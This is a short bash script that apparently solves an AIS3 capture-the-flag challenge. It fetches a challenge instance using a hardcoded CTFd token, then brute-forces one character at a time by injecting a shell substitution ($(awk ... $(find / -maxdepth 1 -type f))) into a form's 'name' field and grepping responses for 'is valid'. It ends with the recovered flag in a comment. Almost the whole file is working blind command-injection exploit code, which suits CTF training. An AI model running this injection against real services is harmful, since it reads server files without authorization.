#!/bin/bash

ctfd='ctfd_7de27241ac3ecd3a9ad87ae1e9c82142116abae3a54ff1a50e331fcfe1163c69'

website=$(curl -X POST -d "token=$ctfd&recreate=on" http://10.105.0.21:21000/  | grep -o 'http://[^<]*' | sed 's/<\/code>//')

#website='http://10.105.0.21:21235'

echo $website

#input='$(awk %27{ if (substr($0,1,1) == ":") print "google.com" }%27 /etc/hosts)'
echo '' > ./tmp
for ((i=32; i<=126; i++)); do
    c=$(printf "%c" "$(printf "\\$(printf %o "$i")")")
    echo $c
    input='$(awk %27{ if (substr($0,33,1) == "'$c'") print "google.com" }%27 $(find / -maxdepth 1 -type f))'
    echo $input
    curl -X POST -d "name=$input" $website >> ./tmp
done
cat ./tmp | grep 'is valid'  
#AIS3{JUST_3aSY_cOmMAnD_INj3c710N}